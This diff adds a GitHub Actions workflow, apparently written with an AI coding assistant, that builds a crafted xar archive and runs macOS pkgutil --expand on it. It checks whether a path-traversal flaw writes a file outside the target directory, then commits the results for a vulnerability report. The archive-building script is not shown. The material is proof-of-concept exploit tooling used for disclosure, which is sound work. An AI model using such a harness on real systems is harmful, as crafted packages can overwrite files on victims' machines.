@@ -1,0 +1,115 @@
+name: pkgutil Path Traversal PoC OE1104428478322
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  run-poc:
+    runs-on: macos-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Build poc.xar
+        run: python3 build_poc_xar.py
+
+      - name: Inspect poc.xar
+        run: python3 inspect_poc.py poc.xar
+
+      - name: Run PoC — pkgutil --expand path traversal
+        run: |
+          echo "======================================"
+          echo "  pkgutil Path Traversal PoC"
+          echo "  Report: OE1104428478322"
+          echo "======================================"
+          echo ""
+          echo "=== System ==="
+          sw_vers
+          uname -m
+          echo ""
+          echo "=== pkgutil version ==="
+          pkgutil --version 2>/dev/null || true
+          which pkgutil
+          echo ""
+          echo "=== poc.xar embedded filename ==="
+          python3 inspect_poc.py poc.xar
+          echo ""
+          echo "=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ==="
+          SAFE_DIR=/tmp/safe_expand_dir
+          ESCAPED=/tmp/pwned_pkgutil
+          rm -rf "$SAFE_DIR" "$ESCAPED"
+          mkdir -p "$SAFE_DIR"
+          pkgutil --expand poc.xar "$SAFE_DIR" 2>&1 || true
+          echo ""
+          echo "=== Contents inside safe_expand_dir ==="
+          find "$SAFE_DIR" -maxdepth 5 2>/dev/null || echo "(empty)"
+          echo ""
+          echo "=== Out-of-bounds check: /tmp/pwned_pkgutil ==="
+          if [ -e "$ESCAPED" ]; then
+            echo "RESULT: VULNERABLE"
+            echo "File written OUTSIDE expansion directory:"
+            ls -la "$ESCAPED"
+            echo "Contents:"
+            cat "$ESCAPED"
+          else
+            echo "File NOT found at /tmp/pwned_pkgutil"
+            echo "Checking for any traversal artifacts:"
+            find /tmp -maxdepth 3 -newer "$SAFE_DIR" 2>/dev/null | grep -v safe_expand_dir || true
+            echo "RESULT: NOT VULNERABLE (or path resolution differs on this macOS version)"
+          fi
+
+      - name: Collect and commit results
+        if: always()
+        run: |
+          mkdir -p results
+          {
+            echo "Report: OE1104428478322"
+            echo "Date: $(date -u)"
+            echo ""
+            echo "--- System ---"
+            sw_vers
+            uname -m
+            echo ""
+            echo "--- Tool ---"
+            which pkgutil
+            pkgutil --version 2>/dev/null || echo "(no --version)"
+            echo ""
+            echo "--- poc.xar embedded filename ---"
+            python3 inspect_poc.py poc.xar
+            echo ""
+            echo "--- Vulnerability check ---"
+            if [ -e "/tmp/pwned_pkgutil" ]; then
+              echo "RESULT: VULNERABLE"
+              ls -la /tmp/pwned_pkgutil
+              echo "Contents: $(cat /tmp/pwned_pkgutil)"
+            else
+              echo "RESULT: path not at expected location"
+              find /tmp -maxdepth 3 2>/dev/null | grep -v safe_expand_dir || true
+            fi
+          } | tee results/poc_terminal_log.txt
+          git config user.email "poc-bot@github-actions"
+          git config user.name "GitHub Actions"
+          git add results/
+          git commit -m "results: poc run $(date -u +%Y-%m-%dT%H:%M:%SZ)
+
+Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>
+Claude-Session: https://claude.ai/code/session_016osine6GRgdkb8UHqaRAGM" || echo "nothing to commit"
+          git push origin main
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-results-${{ github.run_id }}
+          path: |
+            poc.xar
+            build_poc_xar.py
+            inspect_poc.py
+            results/
+          retention-days: 90
